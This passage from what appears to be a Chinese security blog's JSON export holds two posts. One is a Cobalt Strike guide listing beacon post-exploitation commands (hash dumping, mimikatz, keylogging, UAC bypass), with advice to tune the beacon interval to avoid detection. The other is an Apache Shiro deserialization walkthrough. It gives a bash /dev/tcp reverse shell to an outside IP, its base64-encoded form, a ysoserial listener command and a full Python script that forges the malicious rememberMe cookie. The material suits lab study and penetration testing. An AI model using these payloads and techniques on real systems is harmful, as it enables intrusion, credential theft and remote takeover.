参数详情Cobalt Strike 1234567New Connection #新的连接(支持连接多个服务器端)Preferences #偏好设置(设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录等)Visualization #窗口视图模式(展示输出结果的形式)VPN Interfaces #VPN接入Listenrs #监听器(创建Listener)Script Manager #脚本管理Close #关闭 View 12345678910Applications #应用(显示受害者机器的应用信息)Credentials #凭证(通过hashdump或Mimikatz抓取过的密码都会储存在这里)Downloads #下载文件Event Log #事件日志(主机上线记录以及团队协作聊天记录)Keystrokes #键盘记录Proxy Pivots #代理模块Screenshots #截图Script Console #脚本控制台(可以加载各种脚本，增强功能https://github.com/rsmudge/cortana-scripts)Targets #显示目标主机Web Log #Web日志 AttacksPackages 1234567HTML Application #生成恶意的HTA木马文件MS Office Macro #生成office宏病毒文件Payload Generator #生成各种语言版本的payloadUSB/CD AutoPlay #生成利用自动播放运行的木马文件Windows Dropper #捆绑器，能够对文档类进行捆绑Windows Executable #生成可执行PayloadWindows Executable(S) #把包含payload,Stageless生成可执行文件(包含多数功能) Web Drive-by 1234567Manage #对开启的web服务进行管理Clone Site #克隆网站(可记录受害者提交的数据)Host File #提供Web以供下载某文件Scripted Web Delivery #提供Web服务，便于下载和执行PowerShell Payload，类似于Metasploit的web_delivery Signed Applet Attack #启动一个Web服务以提供自签名Java Applet的运行环境Smart Applet Attack #自动检测Java版本并利用已知的exploits绕过securitySystem Profiler #用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等 Reporting 123456780. Activity report #活动报告1. Hosts report #主机报告2. Indicators of Compromise #威胁报告3. Sessions report #会话报告4. Social engineering report #社会工程学报告5. Tactics, Techniques, and Procedures #策略、技巧和程序 Reset Data #重置数据Export Data #导出数据 Help 12345Homepage #官方主页Support #技术支持Arsenal #开发者System information #版本信息About #关于 右键菜单 Access123456Dump Hashes #获取hashElevate #提权Golden Ticket #生成黄金票据注入当前会话Make token #凭证转换Run Mimikatz #运行 Mimikatz Spawn As #用其他用户生成Cobalt Strike侦听器 Explore1234567Browser Pivot #劫持目标浏览器进程Desktop(VNC) #桌面交互File Browser #文件浏览器Net View #命令Net ViewPort Scan #端口扫描Process List #进程列表Screenshot #截图 Pivoting123SOCKS Server #代理服务Listener #反向端口转发Deploy VPN #部署VPN Spawn外部监听器(如指派给MSF，获取meterpreter权限) Session1234Note #备注Remove #删除Sleep #指定被控端休眠时间，默认60秒一次回传，让被控端每10秒来下载一次任务。实际中频率不宜过快,容易被发现。Exit #退出 Interact(打开beacon)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495beacon&gt; helpBeacon Commands===============Command Description------- -----------argue 进程参数欺骗blockdlls 阻止子进程加载非Microsoft DLLbrowserpivot 注入受害者浏览器进程bypassuac 绕过UAC提升权限cancel 取消正在进行的下载cd 切换目录checkin 强制让被控端回连一次clear 清除beacon内部的任务队列connect Connect to a Beacon peer over TCPcovertvpn 部署Covert VPN客户端cp 复制文件dcsync 从DC中提取密码哈希desktop 远程桌面(VNC)dllinject 反射DLL注入进程dllload 使用LoadLibrary将DLL加载到进程中download 下载文件downloads 列出正在进行的文件下载drives 列出目标盘符elevate 使用expexecute 在目标上执行程序(无输出)execute-assembly 在目标上内存中执行本地.NET程序exit 终止beacon会话getprivs Enable system privileges on current tokengetsystem 尝试获取SYSTEM权限getuid 获取用户IDhashdump 转储密码哈希值help 帮助inject 在注入进程生成会话jobkill 结束一个后台任务jobs 列出后台任务kerberos_ccache_use 从ccache文件中导入票据应用于此会话kerberos_ticket_purge 清除当前会话的票据kerberos_ticket_use Apply 从ticket文件中导入票据应用于此会话keylogger 键盘记录kill 结束进程link Connect to a Beacon peer over a named pipelogonpasswords 使用mimikatz转储凭据和哈希值ls 列出文件make_token 创建令牌以传递凭据mimikatz 运行mimikatzmkdir 创建一个目录mode dns 使用DNS A作为通信通道(仅限DNS beacon)mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon)mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon)mode http 使用HTTP作为通信通道mv 移动文件net net命令note 备注 portscan 进行端口扫描powerpick 通过Unmanaged PowerShell执行命令powershell 通过powershell.exe执行命令powershell-import 导入powershell脚本ppid Set parent PID for spawned post-ex jobsps 显示进程列表psexec Use a service to spawn a session on a hostpsexec_psh Use PowerShell to spawn a session on a hostpsinject 在特定进程中执行PowerShell命令pth 使用Mimikatz进行传递哈希pwd 当前目录位置reg Query the registryrev2self 恢复原始令牌rm 删除文件或文件夹rportfwd 端口转发run 在目标上执行程序(返回输出)runas 以其他用户权限执行程序runasadmin 在高权限下执行程序runu Execute a program under another PIDscreenshot 屏幕截图setenv 设置环境变量shell 执行cmd命令shinject 将shellcode注入进程shspawn 启动一个进程并将shellcode注入其中sleep 设置睡眠延迟时间socks 启动SOCKS4代理socks stop 停止SOCKS4spawn Spawn a session spawnas Spawn a session as another userspawnto Set executable to spawn processes intospawnu Spawn a session under another PIDssh 使用ssh连接远程主机ssh-key 使用密钥连接远程主机steal_token 从进程中窃取令牌timestomp 将一个文件的时间戳应用到另一个文件unlink Disconnect from parent Beaconupload 上传文件wdigest 使用mimikatz转储明文凭据winrm 使用WinRM横向渗透wmi 使用WMI横向渗透 使用Listeners简介在本版本Cobalt Strike 3.14中，提供了如图9种 Listener (监听器)。 123456789windows&#x2F;beacon_dns&#x2F;reverse_dns_txtwindows&#x2F;beacon_dns&#x2F;reverse_httpwindows&#x2F;beacon_http&#x2F;reverse_httpwindows&#x2F;beacon_https&#x2F;reverse_httpswindows&#x2F;beacon_smb&#x2F;bind_pipewindows&#x2F;beacon_tcp&#x2F;bind_tcpwindows&#x2F;foreign&#x2F;reverse_httpwindows&#x2F;foreign&#x2F;reverse_httpswindows&#x2F;foreign&#x2F;reverse_tcp (3.13版后增加，支持linuxSSH会话) beacon_xx 系列为Cobalt Strike自身，包括 dns、http、https、smb 四种方式的监听器。 foreign 系列为外部监听器，通常与MSF或者Armitage联动。 在Cobalt Strike 3.13版本后增加了一个新的 Listeners (windows/beacon_tcp/bind_tcp) ，它支持linuxSSH会话。具体更新内容可以查阅 官网 。 创建一个服务首先配置一个监听器 选择 Attacks &gt; Packages &gt; Windows Executable 上线成功，在 Event Log 处出现上线信息。 Beacon右键目标interact来使用Beacon，用它来执行各种命令。在Cobalt Strike中，默认心跳为60s，执行命令的响应很慢，在下载文件时更加明显，所以根据实战环境把时间降低，建议不要太快，否则流量会相对明显，在这里设置sleep 10。 同时在beacon中，如果想对目标进行命令管理，需要在前面加上shell，如shell whoami、shell ipconfig等。 总结这里只是简单描述CobaltStrike的用法，其中还有很多功能的使用，需要实际操作中去发现。更核心的地方在于理解CobaltStrike的Beacon在内网中的通信过程，这对于渗透者能否更进一步深入内网起到重要作用，也是神器的价值所在。 在渗透过程中，不要仅限于单一模式的思路，根据实际的情况，选择更优的方法来进行下一步的渗透测试。","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]},{"title":"Shiro反序列化漏洞复现","slug":"Shiro反序列化漏洞复现","date":"2019-12-03T19:45:48.000Z","updated":"2021-08-06T02:36:12.441Z","comments":true,"path":"2019/1204/.html","link":"","permalink":"https://payloads.cn/2019/1204/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API，您可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。 官方漏洞说明：https://issues.apache.org/jira/browse/SHIRO-550 Shiro提供了记住我（RememberMe）的功能，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问。 Shiro对rememberMe的cookie做了加密处理，默认使用了CookieRememberMeManager字段，内容分别进行 序列化、AES加密、Base64编码操作。 在识别身份的时候，需要对Cookie里的rememberMe字段解密。根据加密的顺序，得知解密的顺序为： 得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。 但是，AES加密的密钥Key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。 检测是否是shiro在cookie参数后加上;rememberMe=1，如果返回包中含有Set-Cookie:rememberMe=deleteMe就是使用了shrio。 影响版本：Apache Shiro &lt;= 1.2.4 NC监听反弹 Shell1nc -lvp 7878 制作反弹shell 代码 使用 http://www.jackson-t.ca/runtime-exec-payloads.html 进行编码。 1bash -i &gt;&amp; /dev/tcp/192.168.1.104/7878 0&gt;&amp;1 使用ysoserial中JRMP监听模块https://github.com/frohoff/ysoserial 12java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 &#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTA0Lzc4NzggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;#反弹 shell 需要进行java base64 编码) Payload 构造前16字节的密钥–&gt;后面加入序列化参数–&gt;AES加密–&gt;base64编码–&gt;发送cookie。 shiro.py 123456789101112131415161718192021import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command): popen = subprocess.Popen([&#x27;java&#x27;, &#x27;-jar&#x27;, &#x27;ysoserial.jar&#x27;, &#x27;JRMPClient&#x27;, command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;) iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == &#x27;__main__&#x27;: payload = encode_rememberme(sys.argv[1])print &quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode()) 使用生成 payload的ysoserial.jar文件和运行目录需处于同一目录下。 将生成的payload通过BurpSuite进行替换发送。 最终，可看到NC已经收到反弹过来的 shell 。","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://payloads.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]}],"categories":[{"name":"权限维持","slug":"权限维持","permalink":"https://payloads.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"name":"Skills","slug":"Skills","permalink":"https://payloads.cn/categories/Skills/"},{"name":"信息收集","slug":"信息收集","permalink":"https://payloads.cn/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"流量分析","slug":"流量分析","permalink":"https://payloads.cn/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"},{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"},{"name":"端口转发","slug":"端口转发","permalink":"https://payloads.cn/categories/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"},{"name":"密码搜集","slug":"密码搜集","permalink":"https://payloads.cn/categories/%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"},{"name":"Mail","slug":"Mail","permalink":"https://payloads.cn/tags/Mail/"},{"name":"Linux","slug":"Linux","permalink":"https://payloads.cn/tags/Linux/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"},{"name":"内网穿透","slug":"内网穿透","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"},{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"},{"name":"Office","slug":"Office","permalink":"https://payloads.cn/tags/Office/"},{"name":"解密客户端","slug":"解密客户端","permalink":"https://payloads.cn/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://payloads.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]}